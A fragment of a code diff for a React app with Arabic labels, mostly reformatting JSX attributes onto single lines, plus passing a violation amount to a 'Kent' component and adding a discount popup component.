                         <div className="col-12">
-                          <button
-                            className="btn btn-block btn-secondary"
-                            id="MQABtnChange"
-                          >
+                          <button className="btn btn-block btn-secondary" id="MQABtnChange">
                             تعديل
                           </button>
                           <div className="d-flex justify-content-center">
-                            <div
-                              className="spinner-grow text-secondary d-none"
-                              role="status"
-                              id="MQAWorkingOnIt"
-                            >
+                            <div className="spinner-grow text-secondary d-none" role="status" id="MQAWorkingOnIt">
                               <span className="sr-only">Loading...</span>
                             </div>
                           </div>
@@ -1411,10 +1164,7 @@ function App(props: { page: any; setPage: any }) {
               </div>
               {/*GET REFERENCE NUMBER*/}
               <div className="card slider-card">
-                <div
-                  className="card-header text-center"
-                  id="mGetReferenceNumber"
-                >
+                <div className="card-header text-center" id="mGetReferenceNumber">
                   <a
                     role="button"
                     data-toggle="collapse"
@@ -1482,20 +1232,12 @@ function App(props: { page: any; setPage: any }) {
                       />
                     </div>
                     <div className="col-12">
-                      <button
-                        type="button"
-                        className="btn btn-block btn-secondary mt-2"
-                        id="btnMGetRefNumKwti"
-                      >
+                      <button type="button" className="btn btn-block btn-secondary mt-2" id="btnMGetRefNumKwti">
                         للكويتين
                       </button>
                     </div>
                     <div className="col-12">
-                      <button
-                        type="button"
-                        className="btn btn-block btn-secondary mt-2"
-                        id="btnMGetRefNumOther"
-                      >
+                      <button type="button" className="btn btn-block btn-secondary mt-2" id="btnMGetRefNumOther">
                         للمقيمين
                       </button>
                     </div>
@@ -1518,11 +1260,13 @@ function App(props: { page: any; setPage: any }) {
           </div>
         </div>
       ) : (
-        <Kent />
+        <Kent violationValue={amount} />
       )}
       <FullPageLoader isLoading={loading} />
+      <DiscountPopup/>
     </>
-  );
+  )
 }
 
-export default App;
+export default App
+
